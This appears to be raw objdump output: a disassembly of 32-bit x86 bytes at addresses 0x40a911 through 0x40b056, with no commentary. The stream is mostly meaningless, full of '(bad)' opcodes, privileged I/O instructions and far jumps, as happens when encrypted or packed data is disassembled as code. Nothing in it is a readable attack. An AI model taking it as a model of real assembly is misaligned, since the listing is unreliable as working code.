  40a911:	cmp    BYTE PTR [ebx],dh
  40a913:	xchg   BYTE PTR ss:[ecx+ebp*2-0x1],al
  40a918:	icebp  
  40a919:	add    ah,BYTE PTR [edi]
  40a91b:	(bad)  
  40a91c:	scas   al,BYTE PTR es:[edi]
  40a91d:	cdq    
  40a91e:	stos   DWORD PTR es:[edi],eax
  40a91f:	and    DWORD PTR [ecx+0x3ad0273f],ecx
  40a925:	jae    0x40a99a
  40a927:	retf   0x3a37
  40a92a:	mov    ebx,0xbf338904
  40a92f:	addr16 jo 0x40a92b
  40a932:	pop    edx
  40a933:	test   eax,esi
  40a935:	add    dh,BYTE PTR ds:0xeb0a7c59
  40a93b:	out    dx,al
  40a93c:	mov    dh,0xc8
  40a93e:	push   esi
  40a93f:	jnp    0x40a9a4
  40a941:	sub    eax,0xf788e45b
  40a946:	fcom   QWORD PTR [ebx+0x13]
  40a949:	xor    DWORD PTR [edx+edx*4-0x11],ecx
  40a94d:	fyl2xp1 
  40a94f:	out    dx,eax
  40a950:	loop   0x40a917
  40a952:	call   0x442ee2d8
  40a957:	arpl   WORD PTR [esp+esi*1-0x73ec5472],ax
  40a95e:	sbb    al,dh
  40a960:	and    BYTE PTR [ebx+eax*1-0x3a],ah
  40a964:	pop    eax
  40a965:	xchg   ebx,eax
  40a966:	adc    al,0xb6
  40a968:	mov    al,0x96
  40a96a:	xlat   BYTE PTR ds:[ebx]
  40a96b:	pop    esp
  40a96c:	cdq    
  40a96d:	(bad)  
  40a96e:	aam    0xee
  40a970:	imul   esi,DWORD PTR [edi+0x5fff9c74],0xfd338caa
  40a97a:	frstor [ebx+0x6caba999]
  40a980:	sbb    dl,BYTE PTR [edx]
  40a982:	aam    0x45
  40a984:	mov    ebx,0x9301f244
  40a989:	mov    ebp,0x65ac5df6
  40a98e:	hlt    
  40a98f:	sbb    eax,0x1f3cfbc2
  40a994:	fcmovne st,st(1)
  40a996:	js     0x40a9d8
  40a998:	retf   
  40a999:	dec    edi
  40a99a:	aaa    
  40a99b:	mov    cl,0x40
  40a99d:	xor    BYTE PTR [esi],dl
  40a99f:	sar    BYTE PTR [edi],1
  40a9a1:	push   esi
  40a9a2:	cmp    BYTE PTR [ebp+eiz*2+0x40118243],bl
  40a9a9:	add    cl,BYTE PTR [ecx+0x6b890a87]
  40a9af:	ret    
  40a9b0:	je     0x40a9e3
  40a9b2:	mov    esp,0x6ae74926
  40a9b7:	jnp    0x40a997
  40a9b9:	push   cs
  40a9ba:	jle    0x40a97a
  40a9bc:	dec    esp
  40a9bd:	clc    
  40a9be:	pop    esp
  40a9bf:	aad    0x93
  40a9c1:	ret    
  40a9c2:	push   edx
  40a9c3:	jge    0x40aa27
  40a9c5:	xchg   esp,eax
  40a9c6:	jo     0x40a9e5
  40a9c8:	out    0x47,al
  40a9ca:	or     al,0xe6
  40a9cc:	fcom   DWORD PTR [edx]
  40a9ce:	xlat   BYTE PTR ds:[ebx]
  40a9cf:	(bad)  
  40a9d0:	fld    DWORD PTR ss:[esi-0x45224782]
  40a9d7:	sub    edx,ebp
  40a9d9:	das    
  40a9da:	mov    eax,ds:0xc7f1f0c2
  40a9df:	or     al,0x63
  40a9e1:	pop    ds
  40a9e2:	jnp    0x40aa2c
  40a9e4:	cmp    dl,dl
  40a9e6:	sub    esi,DWORD PTR [eax+0x6a]
  40a9e9:	xchg   ecx,eax
  40a9ea:	(bad)  
  40a9eb:	cmp    ebp,DWORD PTR [edx+0x1d421b03]
  40a9f1:	mov    dh,0xe0
  40a9f3:	push   ebp
  40a9f4:	xor    cl,BYTE PTR ds:0xa7d578d
  40a9fa:	je     0x40aa7b
  40a9fc:	(bad)  
  40a9fd:	std    
  40a9fe:	arpl   cx,dx
  40aa00:	push   esp
  40aa01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa02:	fisub  WORD PTR ds:0x5afe3b39
  40aa08:	and    DWORD PTR [ebp-0x64],ebp
  40aa0b:	mov    eax,0xa1c54b8d
  40aa10:	jb     0x40aa2e
  40aa12:	jmp    0x40aa0b
  40aa14:	push   eax
  40aa15:	dec    ebp
  40aa16:	repz jae 0x40aa0a
  40aa19:	xchg   ebx,eax
  40aa1a:	jg     0x40a9bb
  40aa1c:	dec    esi
  40aa1d:	gs dec esp
  40aa1f:	clc    
  40aa20:	inc    edi
  40aa21:	cmp    bh,BYTE PTR [eax+0x5934aa5e]
  40aa27:	das    
  40aa28:	mov    dh,0xdd
  40aa2a:	sahf   
  40aa2b:	lods   eax,DWORD PTR ds:[esi]
  40aa2c:	cli    
  40aa2d:	add    DWORD PTR [edx-0x5f8124bf],esi
  40aa33:	imul   esp,DWORD PTR [eax-0x39],0x71
  40aa37:	jno    0x40aa03
  40aa39:	push   es
  40aa3a:	fucomp st(2)
  40aa3c:	jecxz  0x40a9da
  40aa3e:	push   ebp
  40aa3f:	(bad)  [edi+0x41]
  40aa42:	pop    ss
  40aa43:	adc    eax,DWORD PTR [ebp-0x2]
  40aa46:	idiv   BYTE PTR [eax-0x5481ff13]
  40aa4c:	inc    esi
  40aa4d:	das    
  40aa4e:	nop
  40aa4f:	push   0x7b
  40aa51:	mov    dl,BYTE PTR [edx+0x1a75e755]
  40aa57:	xor    eax,0x5680caab
  40aa5c:	stc    
  40aa5d:	cmp    dl,ah
  40aa5f:	jmp    0x2932:0xb6346630
  40aa66:	sbb    dh,BYTE PTR cs:[eax]
  40aa69:	inc    edi
  40aa6a:	std    
  40aa6b:	fcomp  QWORD PTR [edx]
  40aa6d:	or     DWORD PTR [edi+0x62],0x2c
  40aa71:	inc    ecx
  40aa72:	sbb    DWORD PTR [edi+0x5],esi
  40aa75:	gs inc edi
  40aa77:	mov    ebp,0x22de2f9b
  40aa7c:	aas    
  40aa7d:	int3   
  40aa7e:	outs   dx,BYTE PTR ds:[esi]
  40aa7f:	and    eax,0xf5e5615e
  40aa84:	dec    edi
  40aa85:	inc    ebx
  40aa86:	sti    
  40aa87:	mov    ch,0xbd
  40aa89:	aas    
  40aa8a:	in     al,dx
  40aa8b:	fnsave [edx+0x46]
  40aa8e:	addr16 loop 0x40aafe
  40aa91:	gs cmp cl,bh
  40aa94:	add    eax,0x5bdfcb57
  40aa99:	and    BYTE PTR [eax+0x7a],bh
  40aa9c:	or     al,0x2b
  40aa9e:	into   
  40aa9f:	daa    
  40aaa0:	add    BYTE PTR [esi],0x32
  40aaa3:	xchg   ecx,edi
  40aaa5:	jecxz  0x40aa44
  40aaa7:	data16 sbb BYTE PTR [edx-0x2aa5446b],dl
  40aaae:	ret    
  40aaaf:	sub    BYTE PTR [esi-0x2f],dh
  40aab2:	mov    al,0x23
  40aab4:	fwait
  40aab5:	push   ss
  40aab6:	inc    esp
  40aab7:	inc    esp
  40aab8:	repnz pop es
  40aaba:	divps  xmm4,xmm5
  40aabd:	jecxz  0x40aa86
  40aabf:	cmp    ebp,esp
  40aac1:	jg     0x40aaea
  40aac3:	imul   BYTE PTR [ecx+0x7b]
  40aac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aac7:	bound  ecx,QWORD PTR ss:[ebx-0x2af9e684]
  40aace:	xor    al,0x3a
  40aad0:	inc    DWORD PTR [edi]
  40aad2:	cs out 0xde,eax
  40aad5:	mov    ah,0x5a
  40aad7:	out    0xaf,eax
  40aad9:	xchg   BYTE PTR [ebx+edx*8-0x5d],ch
  40aadd:	outs   dx,BYTE PTR ds:[esi]
  40aade:	xchg   BYTE PTR [ebp-0x78dcb719],al
  40aae4:	mov    BYTE PTR [esi-0x15],dh
  40aae7:	pushf  
  40aae8:	pop    ebp
  40aae9:	inc    ebp
  40aaea:	dec    esp
  40aaeb:	(bad)  
  40aaec:	sub    eax,0xf9bb15fe
  40aaf1:	xchg   esi,eax
  40aaf2:	xor    al,0xd
  40aaf4:	repnz adc eax,0x7e7dc29f
  40aafa:	pop    es
  40aafb:	dec    ecx
  40aafc:	cmp    BYTE PTR [edx+0x23],dh
  40aaff:	push   cs
  40ab00:	scas   al,BYTE PTR es:[edi]
  40ab01:	repz dec edx
  40ab03:	and    ebx,DWORD PTR [esi+0x2a]
  40ab06:	mov    dh,0x7b
  40ab08:	scas   al,BYTE PTR es:[edi]
  40ab09:	lods   eax,DWORD PTR ds:[esi]
  40ab0a:	stc    
  40ab0b:	mov    al,ds:0xde7fd5b3
  40ab10:	jp     0x40ab4c
  40ab12:	push   eax
  40ab13:	sbb    edi,ebx
  40ab15:	or     dl,BYTE PTR [ebx+edx*1+0x4a]
  40ab19:	push   edx
  40ab1a:	xchg   ebx,eax
  40ab1b:	retf   
  40ab1c:	vdivss xmm5,xmm6,xmm3
  40ab21:	sub    al,0x18
  40ab23:	repnz retf 0xc57
  40ab27:	ficomp WORD PTR [edx+0x38a4669c]
  40ab2d:	inc    eax
  40ab2e:	xor    eax,0x9bf820b9
  40ab33:	sbb    esi,DWORD PTR [edi-0x17]
  40ab36:	outs   dx,DWORD PTR ds:[esi]
  40ab37:	inc    eax
  40ab38:	in     al,dx
  40ab39:	aam    0xc5
  40ab3b:	sub    dh,BYTE PTR [edx]
  40ab3d:	sub    ah,BYTE PTR [eax+0x42]
  40ab40:	dec    ebp
  40ab41:	mov    eax,0x8b9089c
  40ab46:	into   
  40ab47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab48:	push   edi
  40ab49:	aas    
  40ab4a:	sbb    eax,0x41270df8
  40ab4f:	inc    esp
  40ab50:	jbe    0x40ab54
  40ab52:	dec    edi
  40ab53:	dec    ecx
  40ab54:	mov    bl,0xe0
  40ab56:	fimul  WORD PTR [ebp+0x254d4da9]
  40ab5c:	test   BYTE PTR [esi-0x50],0x5b
  40ab60:	jb     0x40ab12
  40ab62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab63:	cmp    BYTE PTR ds:0x32cb4e3c,bl
  40ab69:	sub    DWORD PTR [esi-0x77],ebp
  40ab6c:	stc    
  40ab6d:	pop    esp
  40ab6e:	xor    ebp,0x2c
  40ab71:	pop    edi
  40ab72:	out    dx,eax
  40ab73:	lahf   
  40ab74:	sbb    DWORD PTR [ecx+0x392c5483],ebx
  40ab7a:	imul   DWORD PTR [esi]
  40ab7c:	fcmovbe st,st(3)
  40ab7e:	or     ch,BYTE PTR [ebp+0x6a]
  40ab81:	cmp    bl,dl
  40ab83:	sahf   
  40ab84:	cs inc esi
  40ab86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab87:	xlat   BYTE PTR ds:[ebx]
  40ab88:	pop    edi
  40ab89:	std    
  40ab8a:	daa    
  40ab8b:	push   ebx
  40ab8c:	push   ebx
  40ab8d:	fs fwait
  40ab8f:	outs   dx,DWORD PTR ds:[esi]
  40ab90:	sti    
  40ab91:	push   esp
  40ab92:	sahf   
  40ab93:	nop
  40ab94:	mov    ah,0x99
  40ab96:	sbb    DWORD PTR [ebp-0x772f5fbb],edx
  40ab9c:	arpl   WORD PTR [ebp+0x3e],cx
  40ab9f:	cld    
  40aba0:	mov    esi,0xfef0863b
  40aba5:	jmp    0x41186e3f
  40abaa:	dec    esp
  40abab:	dec    ecx
  40abac:	or     DWORD PTR [edx+0x12b63749],ecx
  40abb2:	(bad)  
  40abb3:	int3   
  40abb4:	cld    
  40abb5:	sub    ebx,ebx
  40abb7:	cmp    DWORD PTR es:[ebx],0x3f
  40abbb:	ins    BYTE PTR es:[edi],dx
  40abbc:	xor    al,0xe5
  40abbe:	inc    esi
  40abbf:	dec    esp
  40abc0:	or     DWORD PTR [edi-0x24],eax
  40abc3:	pop    esp
  40abc4:	xor    esi,ebx
  40abc6:	retf   
  40abc7:	popa   
  40abc8:	fisttp DWORD PTR [edx-0x2e]
  40abcb:	bound  esp,QWORD PTR [eax-0x2b]
  40abce:	lods   eax,DWORD PTR ds:[esi]
  40abcf:	pop    ds
  40abd0:	test   BYTE PTR [edi],ah
  40abd2:	outs   dx,DWORD PTR ds:[esi]
  40abd3:	jp     0x40ab90
  40abd5:	mov    al,0x3
  40abd7:	dec    eax
  40abd8:	adc    DWORD PTR [edx-0x1b54a240],edx
  40abde:	aad    0x29
  40abe0:	adc    BYTE PTR [ebx],bh
  40abe2:	add    BYTE PTR [ebx-0xa02cb6a],ch
  40abe8:	push   edi
  40abe9:	das    
  40abea:	lods   al,BYTE PTR ds:[esi]
  40abeb:	lods   al,BYTE PTR ds:[esi]
  40abec:	xchg   ecx,eax
  40abed:	cmp    BYTE PTR [ebx],cl
  40abef:	mov    ah,0xc2
  40abf1:	idiv   BYTE PTR [edx+edx*2-0x3cc7b20]
  40abf8:	test   BYTE PTR [edi+0x21],0xa8
  40abfc:	add    ebp,DWORD PTR [ebx]
  40abfe:	ja     0x40ac57
  40ac00:	pop    ds
  40ac01:	dec    esp
  40ac02:	add    BYTE PTR [edi],0x56
  40ac05:	push   edi
  40ac06:	xor    BYTE PTR [eax-0x452792f8],dl
  40ac0c:	mov    al,ds:0x49c85ac9
  40ac11:	inc    edi
  40ac12:	mov    ebx,0x892566c3
  40ac17:	mov    dh,0xef
  40ac19:	mov    edx,0x140d59b4
  40ac1e:	shl    esp,1
  40ac20:	and    DWORD PTR [eax+0x3e02c6e0],ebp
  40ac26:	jo     0x40ac8b
  40ac28:	and    eax,0xd477e16f
  40ac2d:	js     0x40abf6
  40ac2f:	es pop ss
  40ac31:	fnstcw WORD PTR gs:[edx+0x678187bc]
  40ac38:	ret    
  40ac39:	fdivr  QWORD PTR [eax+0x79bc6c2f]
  40ac3f:	add    al,0x8f
  40ac41:	add    bl,BYTE PTR [edi+0x740b616a]
  40ac47:	pop    ebx
  40ac48:	mov    edx,0x70427a7f
  40ac4d:	pop    ecx
  40ac4e:	ss (bad) 
  40ac51:	push   ebx
  40ac52:	(bad)
  40ac56:	mov    ch,0xea
  40ac58:	or     eax,0xd86a05b6
  40ac5d:	cmp    al,0xaa
  40ac5f:	lods   eax,DWORD PTR ds:[esi]
  40ac60:	mov    ch,0xf
  40ac62:	or     dh,BYTE PTR [ebp+0x15d3a796]
  40ac68:	pop    eax
  40ac69:	dec    ebp
  40ac6a:	add    eax,0x2ae09f98
  40ac6f:	adc    al,0xe3
  40ac71:	ja     0x40ac70
  40ac73:	xchg   DWORD PTR [esi-0x370735d4],ecx
  40ac79:	pop    ds
  40ac7a:	sub    BYTE PTR [ecx-0x75197571],bl
  40ac80:	shl    ebp,1
  40ac82:	(bad)  
  40ac83:	push   ebx
  40ac84:	mov    esi,0x2e644b38
  40ac89:	stos   BYTE PTR es:[edi],al
  40ac8a:	and    eax,0xe0a17b03
  40ac8f:	or     cl,dh
  40ac91:	inc    esi
  40ac92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac93:	jecxz  0x40acdd
  40ac95:	mov    ds:0xcc2b8183,al
  40ac9a:	enter  0x6d4a,0xf
  40ac9e:	push   eax
  40ac9f:	jg     0x40ad20
  40aca1:	out    dx,eax
  40aca2:	std    
  40aca3:	xor    eax,0xbed9af3
  40aca8:	mov    dl,0x75
  40acaa:	sub    esi,esi
  40acac:	mov    DWORD PTR [ecx],0x68ff4719
  40acb2:	dec    edi
  40acb3:	mov    ch,0xb8
  40acb5:	mov    esp,0x1190c84b
  40acba:	dec    ecx
  40acbb:	mov    al,ds:0xac4cb968
  40acc0:	fdiv   QWORD PTR [ecx-0x76]
  40acc3:	push   esp
  40acc4:	inc    esp
  40acc5:	adc    esp,DWORD PTR [ecx+0x1b1f0dce]
  40accb:	imul   ebx,DWORD PTR [edi],0x16357b34
  40acd1:	push   eax
  40acd2:	dec    edx
  40acd3:	sbb    edx,edi
  40acd5:	test   BYTE PTR [eax-0x54],al
  40acd8:	loope  0x40acc2
  40acda:	add    BYTE PTR [edx+ecx*4],cl
  40acdd:	lds    edi,FWORD PTR [ebp-0x9bd0d11]
  40ace3:	jnp    0x40ad61
  40ace5:	jmp    0x20c3d221
  40acea:	rcr    edi,cl
  40acec:	stos   BYTE PTR es:[edi],al
  40aced:	rol    DWORD PTR [esi+ebx*1+0x581bb3d3],cl
  40acf4:	jge    0x40ad25
  40acf6:	aas    
  40acf7:	leave  
  40acf8:	pop    es
  40acf9:	bound  eax,QWORD PTR [eax]
  40acfb:	outs   dx,DWORD PTR ds:[esi]
  40acfc:	push   ss
  40acfd:	in     al,dx
  40acfe:	inc    esp
  40acff:	mov    DWORD PTR [esi+0x69],edi
  40ad02:	push   ecx
  40ad03:	out    0xb2,al
  40ad05:	dec    edx
  40ad06:	sub    dh,bh
  40ad08:	mov    cl,bh
  40ad0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad0b:	mov    fs,WORD PTR [ebx]
  40ad0d:	out    dx,eax
  40ad0e:	out    0xc0,eax
  40ad10:	dec    esi
  40ad11:	pushf  
  40ad12:	dec    ebp
  40ad13:	jmp    0x40ad7a
  40ad15:	jmp    0x8d7f:0x1fa1626a
  40ad1c:	mov    ecx,0x16ee7f05
  40ad21:	mov    dl,0xcd
  40ad23:	popf   
  40ad24:	mov    al,ds:0xf3a9ce8
  40ad29:	jge    0x40acd8
  40ad2b:	(bad)  
  40ad2d:	icebp  
  40ad2e:	arpl   di,bx
  40ad30:	cli    
  40ad31:	push   es
  40ad32:	cdq    
  40ad33:	out    0x45,eax
  40ad35:	stos   DWORD PTR es:[edi],eax
  40ad36:	adc    BYTE PTR [edx+esi*1],0x8f
  40ad3a:	stos   DWORD PTR es:[edi],eax
  40ad3b:	jp     0x40ad91
  40ad3d:	mov    ch,0xb5
  40ad3f:	pop    ss
  40ad40:	ja     0x40ada8
  40ad42:	sahf   
  40ad43:	scas   al,BYTE PTR es:[edi]
  40ad44:	sbb    al,0xd7
  40ad46:	push   ebx
  40ad47:	shl    BYTE PTR [eax],0xbc
  40ad4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad4b:	repnz fisttp WORD PTR [ebx]
  40ad4e:	push   ebx
  40ad4f:	enter  0xdd48,0xef
  40ad53:	cwde   
  40ad54:	rol    DWORD PTR [ebx],1
  40ad56:	retf   0xb526
  40ad59:	lock loopne 0x40acf1
  40ad5c:	or     DWORD PTR [edx-0x73],esp
  40ad5f:	jbe    0x40adad
  40ad61:	sti    
  40ad62:	pop    es
  40ad63:	jmp    0x40ad20
  40ad65:	scas   eax,DWORD PTR es:[edi]
  40ad66:	pop    esp
  40ad67:	(bad)  
  40ad68:	jns    0x40ad36
  40ad6a:	sbb    DWORD PTR [esi+0x1cec5893],ecx
  40ad70:	dec    esi
  40ad71:	stos   BYTE PTR es:[edi],al
  40ad72:	stos   BYTE PTR es:[edi],al
  40ad73:	and    ah,BYTE PTR [ebp-0x10]
  40ad76:	outs   dx,BYTE PTR ds:[esi]
  40ad77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad78:	and    esi,ebp
  40ad7a:	mov    ds:0x298d8cf8,al
  40ad7f:	fild   DWORD PTR [edx+0x54]
  40ad82:	jg     0x40ad8c
  40ad84:	push   esp
  40ad85:	lods   eax,DWORD PTR ds:[esi]
  40ad86:	push   0x45
  40ad88:	or     al,cl
  40ad8a:	push   ds
  40ad8b:	or     bh,BYTE PTR [edi-0x1669a042]
  40ad91:	daa    
  40ad92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad93:	pop    ds
  40ad94:	outs   dx,BYTE PTR ds:[esi]
  40ad95:	stos   DWORD PTR es:[edi],eax
  40ad96:	loop   0x40adda
  40ad98:	or     eax,0x444329e1
  40ad9d:	scas   al,BYTE PTR es:[edi]
  40ad9e:	in     eax,dx
  40ad9f:	retf   
  40ada0:	rcr    esi,0x72
  40ada3:	fisubr DWORD PTR [ebx]
  40ada5:	mov    ds:0xcfab7c2d,eax
  40adaa:	mov    BYTE PTR ds:0x1dbfcb52,0x6c
  40adb1:	adc    BYTE PTR ds:0xe70a7408,cl
  40adb7:	mov    ebp,0x51c44358
  40adbc:	(bad)  
  40adbd:	pushf  
  40adbe:	adc    BYTE PTR [ecx-0x2ec7e7c8],0x4b
  40adc5:	jb     0x40ae17
  40adc7:	dec    esi
  40adc8:	sbb    bl,dh
  40adca:	xchg   esp,eax
  40adcb:	sbb    DWORD PTR [edx-0x1784b39e],eax
  40add1:	cmp    BYTE PTR [ecx+0xb],dh
  40add4:	shr    DWORD PTR [ebx-0x5b8a1c03],cl
  40adda:	or     esp,DWORD PTR [edi+0x427eeea7]
  40ade0:	sub    eax,eax
  40ade2:	mov    dh,0xaa
  40ade4:	dec    edx
  40ade5:	xchg   edi,eax
  40ade6:	int3   
  40ade7:	(bad)  
  40ade8:	and    eax,0x579537ad
  40aded:	sub    DWORD PTR [ecx],esi
  40adef:	dec    edx
  40adf0:	cld    
  40adf1:	cmp    esp,ecx
  40adf3:	iret   
  40adf4:	push   esp
  40adf5:	hlt    
  40adf6:	jnp    0x40adf5
  40adf8:	inc    ebx
  40adf9:	xchg   ecx,eax
  40adfa:	mov    ds:0x5336e79a,al
  40adff:	mov    edi,0x36dec472
  40ae04:	xor    BYTE PTR ds:0x5ad2b6f0,ch
  40ae0a:	and    cl,bl
  40ae0c:	outs   dx,DWORD PTR ds:[esi]
  40ae0d:	rcr    DWORD PTR [edi+0x68170688],0xfa
  40ae14:	jmp    0x5643a806
  40ae19:	lock aaa 
  40ae1b:	jmp    0x40ae92
  40ae1d:	jp     0x40aded
  40ae1f:	mov    BYTE PTR ds:0xf360e5d2,bl
  40ae25:	lods   eax,DWORD PTR ds:[esi]
  40ae26:	sahf   
  40ae27:	aam    0xec
  40ae29:	adc    al,BYTE PTR ss:[eax-0x33a689b4]
  40ae30:	pop    ecx
  40ae31:	mov    ah,0x12
  40ae33:	retf   0xbb28
  40ae36:	xor    BYTE PTR [esi-0x5a97db99],0xcb
  40ae3d:	(bad)  
  40ae3f:	daa    
  40ae40:	cld    
  40ae41:	mov    BYTE PTR [edx-0x2e],cl
  40ae44:	sbb    eax,0x118a7a39
  40ae49:	out    0xbd,eax
  40ae4b:	call   FWORD PTR [ecx]
  40ae4d:	sbb    al,0xbc
  40ae4f:	jmp    0x40adea
  40ae51:	clc    
  40ae52:	call   0x9370c546
  40ae57:	push   es
  40ae58:	call   FWORD PTR [eax]
  40ae5a:	xchg   edx,eax
  40ae5b:	repz xor BYTE PTR [ecx],bh
  40ae5e:	pop    es
  40ae5f:	sub    al,0x22
  40ae61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae62:	xor    BYTE PTR [edx-0x67],bh
  40ae65:	xchg   ebx,eax
  40ae66:	pop    ds
  40ae67:	pop    ss
  40ae68:	push   es
  40ae69:	or     eax,0x5fc31984
  40ae6e:	push   ds
  40ae6f:	add    BYTE PTR [ebx+0x322eee66],dl
  40ae75:	out    0x27,al
  40ae77:	es nop
  40ae79:	fld    QWORD PTR [ecx+0x32]
  40ae7c:	inc    ebx
  40ae7d:	addr16 mov ebp,0x7d957a85
  40ae83:	xchg   DWORD PTR [edx],esp
  40ae85:	fisub  WORD PTR [eax+0x76]
  40ae88:	rol    DWORD PTR [ebx],cl
  40ae8a:	push   cs
  40ae8b:	xchg   edx,eax
  40ae8c:	test   cl,ch
  40ae8e:	imul   esi,DWORD PTR [esi+edx*1-0x15a2086b],0x6dc17386
  40ae99:	(bad)  
  40ae9a:	sbb    BYTE PTR [ebp+0x7],cl
  40ae9d:	push   edi
  40ae9e:	shl    DWORD PTR ds:0x73a30010,cl
  40aea4:	scas   al,BYTE PTR es:[edi]
  40aea5:	or     eax,DWORD PTR [ebx-0x486b9548]
  40aeab:	jns    0x40ae32
  40aead:	lock xor BYTE PTR [edi],0x2b
  40aeb1:	and    ecx,DWORD PTR [eax+0xec95676]
  40aeb7:	cmp    ebp,ebp
  40aeb9:	imul   esp,edx,0x7512180e
  40aebf:	cli    
  40aec0:	pusha  
  40aec1:	pusha  
  40aec2:	xchg   esi,eax
  40aec3:	sbb    edx,ebp
  40aec5:	out    dx,al
  40aec6:	xchg   ebp,eax
  40aec7:	xchg   edi,eax
  40aec8:	sub    ch,ch
  40aeca:	fistp  WORD PTR [ecx]
  40aecc:	mov    ah,0xe3
  40aece:	pop    ebp
  40aecf:	mov    ecx,0x8186a0a
  40aed4:	mov    ebp,0xf5f78a91
  40aed9:	dec    esp
  40aeda:	xor    DWORD PTR [esi],ebx
  40aedc:	pop    edx
  40aedd:	cmp    eax,0x8e0b7799
  40aee2:	ss jne 0x40aedf
  40aee5:	cld    
  40aee6:	fmul   QWORD PTR [edx-0x49]
  40aee9:	and    ecx,DWORD PTR [ebp+0x58]
  40aeec:	aas    
  40aeed:	mov    edx,ds
  40aeef:	push   ecx
  40aef0:	add    eax,DWORD PTR [esi]
  40aef2:	add    al,0x87
  40aef4:	stos   BYTE PTR es:[edi],al
  40aef5:	and    eax,0x24f7154c
  40aefa:	dec    ebx
  40aefb:	in     eax,0x34
  40aefd:	imul   esp,DWORD PTR es:[ebp*1+0x3b68a521],0x42eca3ba
  40af09:	mov    bl,0x16
  40af0b:	sbb    BYTE PTR [ebp+0x359625be],0x3
  40af12:	xor    edi,ebx
  40af14:	fld    QWORD PTR [esi+0x35264000]
  40af1a:	xchg   edx,eax
  40af1b:	ret    0x3bae
  40af1e:	pop    esi
  40af1f:	jo     0x40af8d
  40af21:	test   al,0x9f
  40af23:	test   ebp,0x148a9d9e
  40af29:	(bad)  
  40af2a:	push   0x36
  40af2c:	out    dx,eax
  40af2d:	xchg   edx,eax
  40af2e:	shl    DWORD PTR [edx+0x5b],1
  40af31:	fisttp WORD PTR [eax+ebx*4]
  40af34:	fldenv [ebp-0x59]
  40af37:	pop    esi
  40af38:	inc    edx
  40af39:	xor    eax,0xcf56d9d9
  40af3e:	lock xor edi,DWORD PTR [edi]
  40af41:	loop   0x40aeef
  40af43:	div    BYTE PTR [ebp+0x37]
  40af46:	mov    dl,0x74
  40af48:	cli    
  40af49:	jge    0x40afa1
  40af4b:	test   BYTE PTR [eax+0x58],bl
  40af4e:	repnz mov al,0x26
  40af51:	pop    ds
  40af52:	xchg   edi,eax
  40af53:	adc    edx,DWORD PTR [ebp-0x312b86ba]
  40af59:	cmc    
  40af5a:	push   ebp
  40af5b:	dec    edx
  40af5c:	(bad)  [eax+0x49c6afe9]
  40af62:	cdq    
  40af63:	sar    BYTE PTR [esi+0x72],0x60
  40af67:	dec    edi
  40af68:	int    0x9f
  40af6a:	xchg   ebx,eax
  40af6b:	std    
  40af6c:	jp     0x40af2c
  40af6e:	xchg   ebp,eax
  40af6f:	scas   al,BYTE PTR es:[edi]
  40af70:	(bad)  
  40af71:	and    esp,esi
  40af73:	or     DWORD PTR [ebx+edi*1],eax
  40af76:	in     eax,dx
  40af77:	xor    BYTE PTR [edx+0x32fbe6fb],cl
  40af7d:	sub    eax,0xc723bdf2
  40af82:	sbb    DWORD PTR [ebx+edi*1+0x9862ce6],edi
  40af89:	aad    0xff
  40af8b:	sti    
  40af8c:	cdq    
  40af8d:	(bad)
  40af92:	pop    ds
  40af93:	mov    cl,cl
  40af95:	addr16 mov esp,0x2ff67697
  40af9b:	cmp    eax,DWORD PTR [esi-0x5e25b2a8]
  40afa1:	popf   
  40afa2:	popf   
  40afa3:	add    cl,BYTE PTR [eax+esi*4]
  40afa6:	or     DWORD PTR [edi-0x786e5a83],esi
  40afac:	mov    ds,WORD PTR [edx+0x61]
  40afaf:	repnz cld 
  40afb1:	xchg   ebp,eax
  40afb2:	mov    dh,0x6b
  40afb4:	cmp    eax,0xcf4b829a
  40afb9:	mov    dl,BYTE PTR [ebp+0x4b]
  40afbc:	jae    0x40af84
  40afbe:	cmp    al,0x93
  40afc0:	mov    bl,0xcc
  40afc2:	inc    esp
  40afc3:	(bad)  
  40afc5:	(bad)  
  40afc6:	jae    0x40af61
  40afc8:	neg    DWORD PTR [ecx-0x365f7198]
  40afce:	mov    bh,0x17
  40afd0:	mov    edi,0x8d007c1
  40afd5:	fldcw  WORD PTR [edx-0xe12544a]
  40afdb:	hlt    
  40afdc:	mov    ch,0x44
  40afde:	inc    ebp
  40afdf:	fadd   QWORD PTR [edi+0x70]
  40afe2:	cwde   
  40afe3:	outs   dx,DWORD PTR ds:[esi]
  40afe4:	std    
  40afe5:	scas   eax,DWORD PTR es:[edi]
  40afe6:	xchg   ecx,ebp
  40afe8:	push   0x7f
  40afea:	xor    ch,cl
  40afec:	bound  ecx,QWORD PTR [ecx]
  40afee:	call   0x7242:0x4dac4cb8
  40aff5:	aas    
  40aff6:	lock icebp 
  40aff8:	xchg   BYTE PTR [ebp-0x6307823],cl
  40affe:	and    al,0x6c
  40b000:	mov    cs,WORD PTR [ebp+ecx*4-0x2e475468]
  40b007:	adc    edx,esp
  40b009:	test   bh,ah
  40b00b:	xchg   ebx,eax
  40b00c:	bound  ecx,QWORD PTR [eax-0x4260b210]
  40b012:	lea    edi,[eax+0x3dc45c16]
  40b018:	pop    ss
  40b019:	push   0x10a5ec26
  40b01e:	sbb    ecx,DWORD PTR [ebp-0x3640babe]
  40b024:	je     0x40b06c
  40b026:	adc    eax,edi
  40b028:	mov    ah,0x9f
  40b02a:	pop    ds
  40b02b:	xchg   esi,edi
  40b02d:	pop    es
  40b02e:	pushf  
  40b02f:	add    eax,0xecc35a46
  40b034:	adc    ch,dl
  40b036:	and    ebp,ecx
  40b038:	aas    
  40b039:	mov    eax,0x4fd651f
  40b03e:	cmp    dl,ch
  40b040:	call   0xcfe7:0x6aa44893
  40b047:	ret    0x97d
  40b04a:	sbb    bl,cl
  40b04c:	popf   
  40b04d:	sbb    ebp,DWORD PTR [eax]
  40b04f:	jecxz  0x40afea
  40b051:	jnp    0x40b0c7
  40b053:	push   eax
  40b054:	jne    0x40b066
  40b056:	sti    
